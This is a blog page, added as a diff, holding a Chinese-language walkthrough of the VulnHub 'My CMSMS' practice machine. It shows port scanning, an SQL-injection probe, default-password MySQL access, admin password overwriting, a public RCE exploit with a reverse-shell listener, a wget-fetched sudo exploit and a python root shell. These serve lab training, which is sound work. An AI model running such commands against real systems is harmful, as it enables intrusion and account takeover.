@@ -1,0 +1,289 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>My CMSMS Walkthrough | Ed3n's Blog</title><meta name="author" content="Ed3n"><meta name="copyright" content="Ed3n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="My CMSMS WalkthroughBox Info官网在这里：[My CMSMS: 1](My CMSMS: 1 ~ VulnHub)  The Hack先做全端口扫描 sudo nmap -p- 172.16.33.103   以及应用版本发现 sudo nmap -p22,80,3306,33060 -A 172.16.33.103   仅发现了 HTTP 服务端的 CMS Made S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="My CMSMS Walkthrough">
+<meta property="og:url" content="http://example.com/2025/03/19/MyCMSMS/index.html">
+<meta property="og:site_name" content="Ed3n&#39;s Blog">
+<meta property="og:description" content="My CMSMS WalkthroughBox Info官网在这里：[My CMSMS: 1](My CMSMS: 1 ~ VulnHub)  The Hack先做全端口扫描 sudo nmap -p- 172.16.33.103   以及应用版本发现 sudo nmap -p22,80,3306,33060 -A 172.16.33.103   仅发现了 HTTP 服务端的 CMS Made S">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2025-03-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-25T11:55:24.573Z">
+<meta property="article:author" content="Ed3n">
+<meta property="article:tag" content="Penetration Testing">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/03/19/MyCMSMS/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'My CMSMS Walkthrough',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-25 19:55:24'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/picture/1cb7bea1728b4a7bb41b99b0e4bd2c6220241007.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Ed3n's Blog"><span class="site-name">Ed3n's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">My CMSMS Walkthrough</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-18T16:00:00.000Z" title="发表于 2025-03-19 00:00:00">2025-03-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-25T11:55:24.573Z" title="更新于 2025-03-25 19:55:24">2025-03-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Penetration-Testing/">Penetration Testing</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">982</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="My CMSMS Walkthrough"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="My-CMSMS-Walkthrough"><a href="#My-CMSMS-Walkthrough" class="headerlink" title="My CMSMS Walkthrough"></a>My CMSMS Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：[My CMSMS: 1](<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/my-cmsms-1,498/">My CMSMS: 1 ~ VulnHub</a>)</p>
+<p><img src="/picture/image-20250325194806444.png" alt="image-20250325194806444"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先做全端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.103</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250318105230162.png" alt="image-20250318105230162"></p>
+<p>以及应用版本发现</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,3306,33060 -A 172.16.33.103</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250318105330821.png" alt="image-20250318105330821"></p>
+<p>仅发现了 HTTP 服务端的 CMS Made Simple ，并没有获得其他有用的信息。似乎 33036 端口枚举失败了，尝试进一步探测：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p33060 -A -T4 172.16.33.103</span><br></pre></td></tr></table></figure>
+
+<p>好吧看来还是失败了</p>
+<p><img src="/picture/image-20250318105548168.png" alt="image-20250318105548168"></p>
+<p>先从 22 端口开始，尝试利用配置缺陷，以 root 身份登陆，看看有没有泄露信息</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.103                                       </span><br></pre></td></tr></table></figure>
+
+<p>泄露了 HTTP 服务的 CMS：CMSMS 及作者信息</p>
+<p><img src="/picture/image-20250318105716413.png" alt="image-20250318105716413"></p>
+<p>让我们来看看 80 端口，先做一个目录扫描：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.103/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250318110628253.png" alt="image-20250318110628253"></p>
+<p>发现 phpinfo 访问，发现泄露 mycmsms 版本：4.19.8 </p>
+<p><img src="/picture/image-20250318113200016.png" alt="image-20250318113200016"></p>
+<blockquote>
+<p> 十分遗憾的是，直接搜索 My CMSMS exploit 跳出来的直接是该靶机的解题过程，这不是我的本意</p>
+</blockquote>
+<p>可以在主页面左下角找到 CMS Made Simple 版本 2.2.13</p>
+<p><img src="/picture/image-20250318120029915.png" alt="image-20250318120029915"></p>
+<p>去寻找下 CMS Made Simple 2.2.13 漏洞。遗憾的是，搜索到的漏洞都与要登陆 &#x2F;admin 后才能利用：</p>
+<p><img src="/picture/image-20250318120627194.png" alt="image-20250318120627194"></p>
+<p>可以在这里发现后台登陆页面：</p>
+<p><img src="/picture/image-20250318202509495.png" alt="image-20250318202509495"></p>
+<p>尝试 admin&#x2F;admin ，admin&#x2F;passwd 等弱口令登陆，可惜失败了，同时发现，后台对于输出做了限制，防止用户名泄露</p>
+<p><img src="/picture/image-20250318202825982.png" alt="image-20250318202825982"></p>
+<p>更改 POST 数据，看看有没有 SQL 注入漏洞，也失败了：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;&quot;%)#--%23&amp;password=admin&#x27;&quot;%)#--%23&amp;loginsubmit=Submit&#x27;&quot;%)#--%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250318203122088.png" alt="image-20250318203122088"></p>
+<p>来看下 3306 端口吧，尝试默认密码组合登陆：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 172.16.33.103 -uroot -proot --skip-ssl-verify-server-cert </span><br></pre></td></tr></table></figure>
+
+<p>十分幸运，登陆成功了：</p>
+<p><img src="/picture/image-20250318210954301.png" alt="image-20250318210954301"></p>
+<p>查看数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| cmsms_db           |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.053 sec)</span><br></pre></td></tr></table></figure>
+
+<p>使用 cmsms_db 数据库，查看数据表：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [(none)]&gt; use cmsms_db;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">MySQL [cmsms_db]&gt; show tables;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| Tables_in_cmsms_db             |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| cms_additional_users           |</span><br><span class="line">| cms_additional_users_seq       |</span><br><span class="line">| cms_admin_bookmarks            |</span><br><span class="line">| cms_admin_bookmarks_seq        |</span><br><span class="line">| cms_adminlog                   |</span><br><span class="line">| cms_content                    |</span><br><span class="line">| cms_content_props              |</span><br><span class="line">| cms_content_props_seq          |</span><br><span class="line">| cms_content_seq                |</span><br><span class="line">| cms_event_handler_seq          |</span><br><span class="line">| cms_event_handlers             |</span><br><span class="line">| cms_events                     |</span><br><span class="line">| cms_events_seq                 |</span><br><span class="line">| cms_group_perms                |</span><br><span class="line">| cms_group_perms_seq            |</span><br><span class="line">| cms_groups                     |</span><br><span class="line">| cms_groups_seq                 |</span><br><span class="line">| cms_layout_design_cssassoc     |</span><br><span class="line">| cms_layout_design_tplassoc     |</span><br><span class="line">| cms_layout_designs             |</span><br><span class="line">| cms_layout_stylesheets         |</span><br><span class="line">| cms_layout_templates           |</span><br><span class="line">| cms_layout_tpl_addusers        |</span><br><span class="line">| cms_layout_tpl_categories      |</span><br><span class="line">| cms_layout_tpl_type            |</span><br><span class="line">| cms_locks                      |</span><br><span class="line">| cms_mod_cmsjobmgr              |</span><br><span class="line">| cms_mod_filepicker_profiles    |</span><br><span class="line">| cms_module_deps                |</span><br><span class="line">| cms_module_news                |</span><br><span class="line">| cms_module_news_categories     |</span><br><span class="line">| cms_module_news_categories_seq |</span><br><span class="line">| cms_module_news_fielddefs      |</span><br><span class="line">| cms_module_news_fieldvals      |</span><br><span class="line">| cms_module_news_seq            |</span><br><span class="line">| cms_module_search_index        |</span><br><span class="line">| cms_module_search_items        |</span><br><span class="line">| cms_module_search_items_seq    |</span><br><span class="line">| cms_module_search_words        |</span><br><span class="line">| cms_module_smarty_plugins      |</span><br><span class="line">| cms_module_templates           |</span><br><span class="line">| cms_modules                    |</span><br><span class="line">| cms_permissions                |</span><br><span class="line">| cms_permissions_seq            |</span><br><span class="line">| cms_routes                     |</span><br><span class="line">| cms_siteprefs                  |</span><br><span class="line">| cms_user_groups                |</span><br><span class="line">| cms_userplugins                |</span><br><span class="line">| cms_userplugins_seq            |</span><br><span class="line">| cms_userprefs                  |</span><br><span class="line">| cms_users                      |</span><br><span class="line">| cms_users_seq                  |</span><br><span class="line">| cms_version                    |</span><br><span class="line">+--------------------------------+</span><br><span class="line">53 rows in set (0.035 sec)</span><br></pre></td></tr></table></figure>
+
+<p>查看 cms_users 信息，发现 admin 哈希密码 <code>fb67c6d24e756229aab021cea7605fb3</code> ：</p>
+<p><img src="/picture/image-20250318211324263.png" alt="image-20250318211324263"></p>
+<p>查看该密文是由什么加密：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hash-identifier fb67c6d24e756229aab021cea7605fb3</span><br></pre></td></tr></table></figure>
+
+<p>看起来最有可能是 MD5</p>
+<p><img src="/picture/image-20250318211936574.png" alt="image-20250318211936574"></p>
+<p>看看能不能用 hashcat 的字典模式暴力破解出来：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 0 fb67c6d24e756229aab021cea7605fb3 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>可惜没跑出来</p>
+<p><img src="/picture/image-20250318212045908.png" alt="image-20250318212045908"></p>
+<p>由于是 root 权限，看看能不能直接更改密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [cmsms_db]&gt; update cms_users set password = MD5(&#x27;123456&#x27;) where username = &#x27;admin&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.037 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure>
+
+<p>使用 admin &#x2F; 123456 登陆看看，还是失败了</p>
+<p><img src="/picture/image-20250318213254470.png" alt="image-20250318213254470"></p>
+<p>既然已知 CMS 的版本，那岂不是可以去网上搜索 admin 账户的密码的加密方式？说干就干，在网站搜索 CMS Made Simple admin password </p>
+<p>幸运的是，在 <a target="_blank" rel="noopener" href="https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery">CMS Made Simple Admin password recovery</a> 中找到了 admin 密码的加密方式：</p>
+<p><img src="/picture/image-20250318215218448.png" alt="image-20250318215218448"></p>
+<p>稍作更改：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = &#x27;sitemask&#x27;),&#x27;&#x27;),&#x27;123&#x27;))) where username = &#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>成功进入后台：</p>
+<p><img src="/picture/image-20250318215409826.png" alt="image-20250318215409826"></p>
+<p>使用 <a target="_blank" rel="noopener" href="https://dev.cmsmadesimple.org/bug/view/12275">https://dev.cmsmadesimple.org/bug/view/12275</a> 中的 exp 尝试 RCE</p>
+<p><img src="/picture/image-20250318220216279.png" alt="image-20250318220216279"></p>
+<p>利用失败，尝试扩大利用范围，使用版本相近的 2.2.14 exp 代码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -m 48779</span><br><span class="line">python 48779.py --url http://172.16.33.103/admin/login.php -u admin -p 123 -lhost 10.8.0.90 -lport 1234</span><br><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>
+
+<p>getshell ：</p>
+<p><img src="/picture/image-20250318222649383.png" alt="image-20250318222649383"></p>
+<p><img src="/picture/image-20250318222710238.png" alt="image-20250318222710238"></p>
+<p>接下来是提权，查看 sudo 版本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -V</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250319182043155.png" alt="image-20250319182043155"></p>
+<p>搜索对应版本 sudo 漏洞利用代码：CVE-2021-3156</p>
+<p>上传至目标主机</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.90:4444/exp.py</span><br><span class="line"><span class="built_in">chmod</span> +x exp.py</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="/picture/image-20250319182951767.png" alt="image-20250319182951767"></p>
+<p>或者在 &#x2F;var&#x2F;www&#x2F;html&#x2F;admin 目录下发现 .htpasswd 文件，内容为密文 <code>TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=</code></p>
+<p>使用 cyberchef 的 magic 方法破解出账户和密码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">armour:Shield@123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250319183333186.png" alt="image-20250319183333186"></p>
+<p>切换至 armour 用户</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su armour</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250319183733223.png" alt="image-20250319183733223"></p>
+<p>该用户具有 pyhon sudo 权限</p>
+<p><img src="/picture/image-20250319184057890.png" alt="image-20250319184057890"></p>
+<p>使用 python 提权：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python -c <span class="string">&#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="/picture/image-20250319184130060.png" alt="image-20250319184130060"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Ed3n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/19/MyCMSMS/">http://example.com/2025/03/19/MyCMSMS/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Ed3n's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a><a class="post-meta__tags" href="/tags/vulnhub/">vulnhub</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/03/22/Assertion101/" title="Assertion101 Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Assertion101 Walkthrough</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/11/XXE%20exploit/" title="XXE 学习记录"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XXE 学习记录</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/03/22/Assertion101/" title="Assertion101 Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-22</div><div class="title">Assertion101 Walkthrough</div></div></a></div><div><a href="/2025/03/23/Born2root/" title="Born2root Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-23</div><div class="title">Born2root Walkthrough</div></div></a></div><div><a href="/2025/03/24/HAWordy/" title="HAWordy Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-24</div><div class="title">HAWordy Walkthrough</div></div></a></div><div><a href="/2025/03/25/HackInOS/" title="HackInOS Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-25</div><div class="title">HackInOS Walkthrough</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ed3n</div><div class="author-info__description">Try Harder</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#My-CMSMS-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">My CMSMS Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Box-Info"><span class="toc-number">1.1.</span> <span class="toc-text">Box Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Hack"><span class="toc-number">1.2.</span> <span class="toc-text">The Hack</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/25/HackInOS/" title="HackInOS Walkthrough">HackInOS Walkthrough</a><time datetime="2025-03-24T16:00:00.000Z" title="发表于 2025-03-25 00:00:00">2025-03-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/24/HAWordy/" title="HAWordy Walkthrough">HAWordy Walkthrough</a><time datetime="2025-03-23T16:00:00.000Z" title="发表于 2025-03-24 00:00:00">2025-03-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/23/Born2root/" title="Born2root Walkthrough">Born2root Walkthrough</a><time datetime="2025-03-22T16:00:00.000Z" title="发表于 2025-03-23 00:00:00">2025-03-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/22/Assertion101/" title="Assertion101 Walkthrough">Assertion101 Walkthrough</a><time datetime="2025-03-21T16:00:00.000Z" title="发表于 2025-03-22 00:00:00">2025-03-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/19/MyCMSMS/" title="My CMSMS Walkthrough">My CMSMS Walkthrough</a><time datetime="2025-03-18T16:00:00.000Z" title="发表于 2025-03-19 00:00:00">2025-03-19</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/picture/a69647b6950c4fc9af05c83a58673de720241007.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By Ed3n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script 